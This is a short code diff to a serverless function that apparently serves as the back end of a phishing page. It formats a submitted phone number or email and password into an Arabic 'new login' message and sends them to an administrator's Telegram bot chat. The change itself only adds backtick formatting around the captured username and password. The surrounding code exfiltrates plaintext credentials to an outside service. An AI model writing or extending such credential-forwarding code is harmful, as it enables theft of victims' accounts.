@@ -20,7 +20,7 @@ exports.handler = async function (event, context) {
         };
     }
 
-    const message = `تسجيل دخول جديد .\n\nالرقم او البريد : ${text}\nالرمز : ${password}`;
+    const message = `تسجيل دخول جديد .\n\nالرقم او البريد : \`${text}\`\nالرمز : \`${password}\``;
 
     const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${adminId}&text=${encodeURIComponent(message)}`;
 
